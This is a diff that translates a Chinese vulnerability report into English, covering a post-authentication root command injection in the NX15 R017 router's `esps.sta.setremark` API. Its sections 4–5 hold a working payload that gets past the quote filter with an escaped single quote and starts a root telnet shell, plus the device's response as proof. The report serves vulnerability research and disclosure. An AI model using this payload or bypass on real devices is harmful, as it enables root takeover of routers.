@@ -1,42 +1,42 @@
-# NX15 R017 `esps.sta.setremark` 后置独立 root RCE
+# NX15 R017 `esps.sta.setremark` Post-Authentication Independent root RCE
 
-## 1. 结论
+## 1. Conclusion
 
-在 NX15 R017 上，`/api/esps` 的：
+On NX15 R017, the following `/api/esps` handler:
 
 - `object = esps.sta`
 - `method = setremark`
 
-存在一条**新的、独立的、即时触发型后认证 root RCE**。
+contains a **new, independent, immediate-trigger post-authentication root RCE**.
 
-- **接口**：`POST /api/esps`
-- **对象**：`esps.sta`
-- **方法**：`setremark`
-- **注入点**：`name`
-- **权限**：后认证（管理员会话）
-- **结果**：以 **root** 权限执行任意命令
-- **验证设备**：`192.168.8.1`，NX15 firmware `R017`
-- **结论等级**：**Confirmed / Exploited**
+- **Endpoint**: `POST /api/esps`
+- **Object**: `esps.sta`
+- **Method**: `setremark`
+- **Injection point**: `name`
+- **Privilege requirement**: post-authentication administrator session
+- **Impact**: arbitrary command execution as **root**
+- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
+- **Status**: **Confirmed / Exploited**
 
-这条链的价值非常高，因为它不是“包装调用下游对象才碰巧出命令执行”，而是：
+This chain is highly valuable because it is not merely command execution that happens incidentally through a wrapper call into a downstream object. Instead:
 
-1. `setremark` 自身存在危险 `eval`；
-2. 利用时**不需要合法 MAC**；
-3. 即便把 `mac` 设置成 `NOT_A_MAC`，仍可直接拉起 root shell。
+1. `setremark` itself contains a dangerous `eval`.
+2. Exploitation **does not require a valid MAC address**.
+3. Even when `mac` is set to `NOT_A_MAC`, a root shell can still be spawned directly.
 
-这说明其 root cause 在 `esps.sta.setremark` 本身，而不是下游 `esps.macfilter.modify` 的业务逻辑。
+This demonstrates that the root cause is in `esps.sta.setremark` itself, not in the downstream business logic of `esps.macfilter.modify`.
 
 ---
 
-## 2. 根因分析
+## 2. Root Cause Analysis
 
-目标脚本：
+Target script:
 
 - `/usr/libexec/rpcd/esps.sta`
 
-### 2.1 `setremark` 总是进入危险分支
+### 2.1 `setremark` always enters the dangerous branch
 
-代码：
+Code:
 
 ```sh
 userfilter=$(uci get ability.macfilter.newforbidden) || userfilter=0
@@ -46,22 +46,20 @@ if [ "$userfilter" == "1" ]; then
 fi
 ```
 
-这里读取的不是运行时开关 `userfilter.basicinfo.enable`，
-而是能力配置 `ability.macfilter.newforbidden`。
+The value read here is not the runtime switch `userfilter.basicinfo.enable`, but the capability configuration `ability.macfilter.newforbidden`.
 
-在 NX15 R017 固件中：
+In NX15 R017 firmware:
 
 ```sh
 etc/config/ability:
 option newforbidden '1'
 ```
 
-因此 `setremark` 在当前设备上**始终走危险分支**，
-与“禁止新用户上网”功能是否启用无关。
+Therefore, on the current device, `setremark` **always enters the dangerous branch**, regardless of whether the "forbid new users from accessing the Internet" feature is enabled.
 
-### 2.2 `name` 被拼进 JSON，再被单引号包裹进 `eval`
+### 2.2 `name` is inserted into JSON and then wrapped in single quotes before `eval`
 
-在危险分支里：
+Inside the dangerous branch:
 
 ```sh
 json_get_var _mac mac
@@ -72,7 +70,7 @@ para="'"$strJson"'"
 eval ubus call esps.macfilter modify "$para"
 ```
 
-其中 `joint_json()` 定义为：
+The function `joint_json()` is defined as:
 
 ```sh
 joint_json()
@@ -85,41 +83,41 @@ joint_json()
 }
 ```
 
-也就是说：
-- 攻击者控制的 `name` 会被作为 JSON `description` 字段进入 `strJson`；
-- 随后整段 `strJson` 被 `para='...json...'` 再用**单引号**包住；
-- 最后送进 `eval ubus call esps.macfilter modify "$para"`。
+That means:
+- The attacker-controlled `name` is inserted into `strJson` as the JSON `description` field.
+- The entire `strJson` value is then wrapped again in **single quotes** as `para='...json...'`.
+- The result is finally passed to `eval ubus call esps.macfilter modify "$para"`.
 
-这正是典型的：
+This is a classic case of:
 
-> **JSON 字符串 + shell 单引号包装 + eval 二次解析**
+> **JSON string + shell single-quote wrapping + secondary parsing by eval**
 
-一旦 `name` 中有真实单引号，就可以直接打断 `para='...` 的 shell 引号上下文，执行攻击者命令。
+Once a real single quote appears in `name`, it can directly break out of the `para='...` shell-quote context and execute attacker-controlled commands.
 
-### 2.3 为什么 `'` 能稳定利用
+### 2.3 Why the single quote is reliably exploitable
 
-直接原始单引号请求会被 `/api/esps` 外层过滤，返回：
+A request containing a raw literal single quote is blocked by the outer `/api/esps` filter, which returns:
 
 ```json
 {"code":21,"message":"'"}
 ```
 
-但如果在 raw JSON body 中使用：
+However, if the raw JSON body uses a JSON Unicode-escaped single quote:
 
 ```json
-"name":"x';...;#"
+"name":"x\u0027;...;#"
 ```
 
-那么：
-- 外层原始字符过滤不会直接命中；
-- JSON 解析完成后，脚本变量 `_name` 中已经是真实单引号；
-- 该单引号在 `eval ubus call esps.macfilter modify "$para"` 里打断 shell 语义，从而执行 payload。
+then:
+- The outer raw-character filter does not directly match it.
+- After JSON parsing, the script variable `_name` already contains a real single quote.
+- That single quote breaks the shell semantics inside `eval ubus call esps.macfilter modify "$para"`, causing the payload to execute.
 
 ---
 
-## 3. 关键静态证据
+## 3. Key Static Evidence
 
-### 3.1 能力开关决定危险分支总是在线
+### 3.1 The capability switch keeps the dangerous branch always available
 
 ```sh
 userfilter=$(uci get ability.macfilter.newforbidden) || userfilter=0
@@ -128,20 +126,20 @@ if [ "$userfilter" == "1" ]; then
 fi
 ```
 
-### 3.2 `name` 进入 `joint_json`
+### 3.2 `name` enters `joint_json`
 
 ```sh
 json_get_var _name name
 strJson=$(joint_json "$_mac" "$_name" "$netStat")
 ```
 
-### 3.3 整段 JSON 再被单引号包裹
+### 3.3 The entire JSON string is wrapped in single quotes
 
 ```sh
 para="'"$strJson"'"
 ```
 
-### 3.4 `eval` 触发命令执行
+### 3.4 `eval` triggers command execution
 
 ```sh
 eval ubus call esps.macfilter modify "$para"
@@ -149,11 +147,11 @@ eval ubus call esps.macfilter modify "$para"
 
 ---
 
-## 4. 利用方式
+## 4. Exploitation Method
 
-### 4.1 直接原始单引号会被外层挡住
+### 4.1 A raw literal single quote is blocked by the outer layer
 
-请求：
+Request:
 
 ```json
 [
@@ -169,15 +167,15 @@ eval ubus call esps.macfilter modify "$para"
 ]
 ```
 
-返回：
+Response:
 
 ```json
 {"code":21,"message":"'"}
 ```
 
-### 4.2 使用 `'` 后，非法 MAC 也能打通 root RCE
+### 4.2 With `\u0027`, even an invalid MAC can achieve root RCE
 
-成功请求示例：
+Example successful request:
 
 ```json
 [
@@ -187,23 +185,23 @@ eval ubus call esps.macfilter modify "$para"
     "method": "setremark",
     "param": {
       "mac": "NOT_A_MAC",
-      "name": "k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
+      "name": "k\u0027;echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
     }
   }
 ]
 ```
 
-这条请求中：
-- `mac` 故意使用非法值 `NOT_A_MAC`；
-- 若命令执行仍成功，就能证明**漏洞发生在 `setremark` 自己的 `eval` 里**，而不是后续 MAC 处理逻辑中。
+In this request:
+- `mac` is intentionally set to the invalid value `NOT_A_MAC`.
+- If command execution still succeeds, it proves that **the vulnerability occurs inside `setremark`'s own `eval`**, not in later MAC-processing logic.
 
 ---
 
-## 5. 动态验证
+## 5. Dynamic Verification
 
-### 5.1 `setremark` 对非法 MAC 也能直接命中
+### 5.1 `setremark` can be hit directly even with an invalid MAC
 
-请求：
+Request:
 
 ```json
 [
@@ -213,23 +211,23 @@ eval ubus call esps.macfilter modify "$para"
     "method": "setremark",
     "param": {
       "mac": "NOT_A_MAC",
-      "name": "k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
+      "name": "k\u0027;echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
     }
   }
 ]
 ```
 
-返回：
+Response:
 
 ```json
 [{"id":1,"result":{"mac":"NOT_A_MAC","name":"k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"}}]
 ```
 
-返回体已经明显偏离原始预期格式，说明 shell 语义已被破坏。
+The response body clearly deviates from the originally expected format, indicating that the shell semantics have been broken.
 
-### 5.2 Root shell 证明
+### 5.2 Root shell proof
 
-随后连接 `192.168.8.1:2476`，得到：
+Then connecting to `192.168.8.1:2476` produced:
 
 ```text
 BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
@@ -239,50 +237,50 @@ Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
 STABADMAC_OK
 ```
 
-这直接证明：
-- 命令执行发生在 root 上下文；
-- 且与后续 MAC 合法性约束无关。
+This directly proves that:
+- Command execution occurs in the root context.
+- It is unrelated to later MAC-validity constraints.
 
-## 6. 风险评估
+## 6. Risk Assessment
 
-成功利用后，攻击者可：
+After successful exploitation, an attacker can:
 
-- 以 root 身份执行任意命令
-- 在设备当前联网状态下直接植入后门
-- 无需先准备合法业务对象或现有终端条目
+- Execute arbitrary commands as root.
+- Implant a backdoor directly while the device is online.
+- Exploit the issue without preparing a valid business object or an existing terminal entry first.
 
-由于利用不依赖合法 MAC，攻击成本比许多业务型注入更低。
+Because exploitation does not depend on a valid MAC address, the attack cost is lower than many business-logic injection chains.
 
 ---
 
 ## 7. POC
 
-已落地 POC：
+Implemented POC:
 
 - `poc/postauth_esps_sta_setremark_rce.py`
 
-运行示例：
+Execution example:
 
 ```bash
 python3 poc/postauth_esps_sta_setremark_rce.py --cleanup --port 2476
 ```
 
-POC 默认直接使用：
+By default, the POC directly uses:
 
 - `--mac NOT_A_MAC`
 
-以突出证明这是 `setremark` 自己的 wrapper-level `eval` 命令注入。
+This highlights that the issue is a wrapper-level `eval` command injection in `setremark` itself.
 
 ---
 
-## 8. 结论
+## 8. Conclusion
 
-`esps.sta.setremark` 提供了一条新的**即时型后认证 root RCE**。根因是：
+`esps.sta.setremark` provides a new **immediate post-authentication root RCE**. The root cause is:
 
-- 能力开关 `ability.macfilter.newforbidden=1` 使危险分支始终在线；
-- `name` 被写入 JSON 字符串；
-- 整段 JSON 又被 `para='...json...'` 的 shell 单引号包裹；
-- 随后进入 `eval ubus call esps.macfilter modify "$para"`；
-- `'` 能绕过外层过滤并在 `eval` 中形成真实的 shell breakout。
+- The capability switch `ability.macfilter.newforbidden=1` keeps the dangerous branch always available.
+- `name` is written into a JSON string.
+- The whole JSON string is then wrapped in shell single quotes as `para='...json...'`.
+- The result is passed into `eval ubus call esps.macfilter modify "$para"`.
+- `\u0027` can bypass the outer filter and create a real shell breakout inside `eval`.
 
-更重要的是：**非法 MAC 也能成功命令执行**，说明它的 root cause 在 `setremark` 自身，而不是下游业务逻辑。
+More importantly, **command execution succeeds even with an invalid MAC address**, proving that the root cause is in `setremark` itself rather than in downstream business logic.
